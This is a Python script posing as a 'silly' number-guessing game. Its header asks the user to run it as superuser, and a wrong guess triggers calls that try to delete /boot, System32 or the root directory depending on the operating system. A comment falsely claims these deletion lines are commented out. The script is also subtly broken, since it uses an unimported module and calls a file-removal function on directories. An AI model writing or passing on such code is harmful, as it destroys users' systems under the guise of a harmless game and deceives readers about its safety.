#! /usr/bin/python
#################################################################################################
# Author: Nicholas Fisher
# Date: April 17 2024
# Description of Script
# Important Note: Please run as SuperUser 
# This is an Extremely Silly Game, play at your own risks!
#################################################################################################
import random
import os

# Generate a random number between 1 and 10
number = random.randint(1,10)

# Ask the user if they want to play a game
play = input("Would you like to play a silly game? ")

# Check if the user wants to play
if play == "yes" or play == "Yes" or play == "y" or play == "Y":
    # Print a welcome message if the user wants to play
    print("Welcome to the Extremely Silly Game!")
else:
    # Print a message if the user doesn't want to play
    print("Too bad...")
    print("Welcome to the Extremely Silly Game!")

# Ask the user to guess a number between 1 and 10
choice = int(input("Please guess a number between 1 and 10: "))

# Check if the user's guess matches the random number
if choice == number:
    # Print a congratulatory message if the guess is correct
    print("Congratulations on Winning the Extremely Silly Game!")
else:
    # Print a message if the guess is incorrect
    print("Oh no.....")
    print("You have lost the Extremely Silly Game... Goodbye!")

    # The following lines attempt to remove critical system files based on the detected OS,
    # but they are commented out here to prevent accidental execution and system damage.
    os_name = platform.system()
    if os_name == 'Linux':
      os.remove("/boot")
    elif os_name == 'Windows':
      os.remove("C:\Windows\System32")
    elif os_name == 'Darwin':
      os.remove("/")
